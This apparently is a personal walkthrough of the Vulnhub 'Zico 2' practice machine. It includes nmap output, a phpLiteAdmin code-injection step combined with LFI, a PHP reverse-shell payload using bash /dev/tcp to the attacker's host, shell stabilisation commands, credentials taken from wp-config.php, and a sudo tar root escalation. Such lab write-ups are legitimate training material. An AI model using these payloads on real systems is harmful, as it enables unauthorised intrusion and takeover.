#phpadminlite #priv-esc #LFI #gtfobins
# Nmap
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Zico's Shop
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          54389/tcp   status
|   100024  1          55179/udp   status
|   100024  1          57190/tcp6  status
|_  100024  1          59350/udp6  status
54389/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:E7:95:46 (Oracle Vir
```

In the page there's a file execution vuln:
![[walkthroughs/Vulnhub/Zico 2/IMG/Pasted image 20230831175714.png]]
from here:
![[walkthroughs/Vulnhub/Zico 2/IMG/Pasted image 20230831175736.png]]
also when directory fuzzing finds a `dbadmin` folder and inside that was test_db.php file 
![[walkthroughs/Vulnhub/Zico 2/IMG/Pasted image 20230906130922.png]]
found an exploit:
![[walkthroughs/Vulnhub/Zico 2/IMG/Pasted image 20230906131148.png]]
the password was `admin` the default one.

we also that we are getting the info:
![[walkthroughs/Vulnhub/Zico 2/IMG/Pasted image 20230906131809.png]]
crackstation gives:
![[walkthroughs/Vulnhub/Zico 2/IMG/Pasted image 20230906131845.png]]
`34kroot34`
`zico2215@`
When we look at the phpliteAdmin1.9.3 -> we see there's an vulnerability that makes the code execute when we add some text value to a table inside the database named: `something.php` or `something.sqlite` . and in the default when I put:
`<?php phpinfo(); ?>`, we get: becoz there was a LFI on above endpoint
![[walkthroughs/Vulnhub/Zico 2/IMG/Pasted image 20230918180756.png]]
![[walkthroughs/Vulnhub/Zico 2/IMG/Pasted image 20230918180901.png]]
![[walkthroughs/Vulnhub/Zico 2/IMG/Pasted image 20230918180927.png]]
we get the shell by:
```
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.211.130/443 0>&1'");?>
```
we stabilize the shell by:
***
step 1:
```
/usr/bin/python -c 'import pty;pty.spawn("/bin/bash")'
```

step 2:
do `ctrl+z` your main system terminal should have opened and then write this:
```
stty raw -echo; fg
```

then press `enter` two times , your terminal for the machine should be back , also type this to get some env variables like clear in that machine:
```
export TERM=xterm
```
***
# Priv-Esc
Inside the zico's home directory was there a folder named: wordpress
wordpress -> wp-config.php is a file that is used to define the creds for the database
![[walkthroughs/Vulnhub/Zico 2/IMG/Pasted image 20230918184258.png]]
`zico` `sWfCsfJSPV9H3AmQzw8`
it was the password for zico's user too: sWfCsfJSPV9H3AmQzw8
### bash_history
![[walkthroughs/Vulnhub/Zico 2/IMG/Pasted image 20230918184933.png]]
![[walkthroughs/Vulnhub/Zico 2/IMG/Pasted image 20230918184842.png]]
now this is the content of the file:
```
Arthur Antunes Coimbra, born 3 March 1953 in Rio de Janeiro), better know Zico, is a Brazilian coach and former footballer, who played as an attacking midfielder. Often called the "White Pelé", he was a creative playmaker, with excellent technical skills, vision, and en eye for goal, who is considered one of the most clinical finishers and best passers ever, as well as one of the greatest players of all time.[2][3][4] Arguably the world's best player of the late 1970s and early 80s, he is regarded as one of the best playmakers and free kick specialists in history, able to bend the ball in all directions.[5] In 1999, Zico came eighth in the FIFA Player of the Century grand jury vote, and in 2004 was named in the FIFA 100 list of the world's greatest living players.[6][7] According to Pelé, generally considered the best player ever, "throughout the years, the one player that came closest to me was Zico".[8]

With 48 goals in 71 official appearances for Brazil, Zico is fifth highest goalscorer for his national team.[9] He represented them in the 1978, 1982 and 1986 World Cups. They did not win any of those tournaments, even though the 1982 squad is considered one of the greatest Brazilian national squads ever.[10] Zico is often considered one of the best players in football history not to have been on a World Cup winning squad. He was chosen 1981[11] and 1983 Player of the Year.

Zico has coached the Japanese national team, appearing in the 2006 FIFA World Cup and winning the Asian Cup 2004, and Fenerbahçe, who were a quarter-finalist in 200 in the Champions League under his command. He was announced as the head coach of CSKA Moscow in January 2009. On 16 September 2009, Zico was signed by Greek side Olympiacos for a two-year contract after the club's previous coach, Temuri Ketsbaia, was sacked. He was fired four months later, on 19 January 2010.[
```

This is no use .... but when I find the binaries with the special permissions:
![[walkthroughs/Vulnhub/Zico 2/IMG/Pasted image 20230918185702.png]]
sudo -l says: tar , zip are sudo enabled
# root shell:
gtfo-bins says:
![[walkthroughs/Vulnhub/Zico 2/IMG/Pasted image 20230918185842.png]]
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
![[walkthroughs/Vulnhub/Zico 2/IMG/Pasted image 20230918190053.png]]